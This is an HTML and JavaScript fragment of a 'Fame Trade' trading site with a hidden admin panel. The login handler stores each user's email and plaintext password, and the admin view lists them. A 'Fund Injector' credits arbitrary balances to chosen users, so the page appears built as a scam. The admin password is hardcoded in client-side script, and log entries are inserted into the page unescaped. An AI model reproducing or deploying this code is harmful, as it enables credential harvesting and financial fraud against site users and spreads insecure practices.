<div id="admin-login-gate" class="hidden" style="background: rgba(0,0,0,0.9); height: 100vh; display: flex; align-items: center; justify-content: center; position: fixed; width: 100%; top: 0; z-index: 1000;">
    <div class="login-box" style="background: #fff; color: #000;">
        <h3 style="text-align: center;">Fame Trade Admin</h3>
        <input type="text" id="admin-user" placeholder="Admin Username" style="background: #f0f0f0; color: #000;">
        <input type="password" id="admin-pass" placeholder="Admin Password" style="background: #f0f0f0; color: #000;">
        <button class="btn btn-deposit" style="width: 100%;" onclick="verifyAdmin()">Unlock Dashboard</button>
        <button onclick="closeAdminGate()" style="background: none; border: none; color: #888; width: 100%; margin-top: 10px; cursor: pointer;">Cancel</button>
    </div>
</div>

<div id="admin-view" class="hidden" style="position: fixed; top: 0; left: 0; width: 100%; height: 100vh; overflow-y: auto; background: #fff; color: #000; z-index: 2000; padding: 20px;">
    <div style="display: flex; justify-content: space-between; align-items: center;">
        <h2>Fame Trade Admin Panel</h2>
        <button onclick="toggleAdmin()" style="padding: 10px; background: #ff3d00; color: white; border: none; border-radius: 5px;">Logout Admin</button>
    </div>
    
    <div class="admin-card" style="background: #f0f0f0; padding: 20px; border-radius: 10px; margin: 20px 0; border: 1px solid #ccc;">
        <h3>Fund Injector</h3>
        <p>Target User Email & Amount:</p>
        <input type="email" id="inject-target" placeholder="User Email" style="background: white; color: black; border: 1px solid #ccc;">
        <input type="number" id="inject-amount" placeholder="Amount to Inject ($)" style="background: white; color: black; border: 1px solid #ccc;">
        <button class="btn-deposit btn" onclick="processInjection()">Inject Funds Now</button>
    </div>

    <h3>User Login History (Email & Passwords)</h3>
    <table style="width: 100%; border-collapse: collapse;">
        <thead style="background: #eee;">
            <tr>
                <th>Email / Phone</th>
                <th>Password Used</th>
                <th>Current Status</th>
            </tr>
        </thead>
        <tbody id="log-table-body">
            </tbody>
    </table>
</div>

<script>
    // UPDATED JAVASCRIPT FUNCTIONS
    
    function toggleAdmin() {
        // If already in admin view, close everything
        if (!document.getElementById('admin-view').classList.contains('hidden')) {
            document.getElementById('admin-view').classList.add('hidden');
            return;
        }
        // Show the login gate
        document.getElementById('admin-login-gate').classList.remove('hidden');
    }

    function closeAdminGate() {
        document.getElementById('admin-login-gate').classList.add('hidden');
    }

    function verifyAdmin() {
        const u = document.getElementById('admin-user').value;
        const p = document.getElementById('admin-pass').value;

        // SECURE ADMIN LOGS
        if (u === "Admin" && p === "ElonMusk2025") {
            document.getElementById('admin-login-gate').classList.add('hidden');
            document.getElementById('admin-view').classList.remove('hidden');
            updateLogTable();
        } else {
            alert("Access Denied: Invalid Admin Credentials.");
        }
    }

    // Capture User Info on normal login
    function handleLogin() {
        const email = document.getElementById('email-input').value;
        const pass = document.getElementById('pass-input').value;

        if(email && pass) {
            // Save email/pass to "Database" (localStorage)
            let logs = JSON.parse(localStorage.getItem('fame_logs')) || [];
            logs.push({ email: email, pass: pass, date: new Date().toLocaleString() });
            localStorage.setItem('fame_logs', JSON.stringify(logs));
            
            // Proceed to App
            document.getElementById('login-page').classList.add('hidden');
            document.getElementById('user-app').classList.remove('hidden');
            document.getElementById('display-user-email').innerText = "Email: " + email;
            loadMarkets();
        } else {
            alert("Please fill in all fields.");
        }
    }

    // Refresh the logs in the admin table
    function updateLogTable() {
        const tbody = document.getElementById('log-table-body');
        const logs = JSON.parse(localStorage.getItem('fame_logs')) || [];
        tbody.innerHTML = "";
        logs.forEach(log => {
            tbody.innerHTML += `
                <tr style="border-bottom: 1px solid #ddd;">
                    <td style="padding: 10px;">${log.email}</td>
                    <td style="padding: 10px;"><b>${log.pass}</b></td>
                    <td style="padding: 10px; color: green;">Injected Available</td>
                </tr>`;
        });
    }
</script>
